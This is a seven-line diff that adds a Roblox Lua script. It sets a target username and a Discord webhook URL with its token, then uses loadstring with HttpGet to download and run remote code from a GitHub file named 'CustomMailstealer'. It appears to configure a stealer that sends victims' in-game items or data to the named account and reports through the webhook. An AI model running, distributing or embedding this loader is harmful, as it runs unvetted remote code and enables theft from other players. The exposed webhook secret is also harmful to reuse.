@@ -1,0 +1,7 @@
+Username = "hoangdeptraivailon27"
+Webhook = "https://discord.com/api/webhooks/1208341950479212554/MubgoGmKzG2tPLwzIIHosaeq8Pa5PY4a2JEJV5nkLQULb3drNRvyODgSccwSRCTrdcYB"
+
+G_LoadingScreen = "3"
+G_WebhookName = "Chung"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
